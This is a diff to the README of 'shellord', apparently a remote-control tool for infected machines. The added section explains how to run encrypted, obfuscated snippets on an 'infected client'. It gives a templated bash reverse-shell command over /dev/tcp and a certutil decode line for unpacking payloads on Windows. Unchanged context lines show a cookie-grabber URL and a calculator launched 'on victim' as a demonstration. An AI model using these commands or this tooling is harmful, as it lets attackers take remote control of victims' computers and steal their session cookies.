@@ -23,14 +23,26 @@ https://shellord.mibaltoalex.com:60443/grabber/info?cookie=captured
 
 ![shellord-login](../_img/shellord-login.gif)
 
-## Example
+## Snippets
+
+All snippets are packed, compressed and encrypted in `.mar` (MAR; MIBALTOALEX ARchive) files.
+A snippet can contain URIs, binary code, scripts (bash, powershell, etc) and plain text (.c, .py, .java, .rs, .sh, .rb, .bat, .txt, ...).
+
+Allows you to run any obfuscated snippet on the infected client.
+
+Example to use parameters in snippets: 
+```bash
+# bash
+bash -c 'exec bash -i &>/dev/tcp/~[[rhost]]/~[[rport]] <&1'
+```
+```powershell
+# powershell
+certutil -decode ~[[file_input]] ~[[file_output]]
+```
+
+### Example
 
 Example launch calculator on victim (Windows)
 
 ![shellord-calc](../_img/shellord_calc.gif)
 
-## Snippets
-
-All snippets are packed, compressed and encrypted in `.mar` (MAR; MIBALTOALEX ARchive) files.
-A snippet can contain URIs, binary code, scripts (bash, powershell, etc) and plain text (.c, .py, .java, .rs, .sh, .rb, .bat, .txt, ...).
-Example to use parameters in snippets: `echo ~[[param1]]; base64 -w0 ~[[file]]`
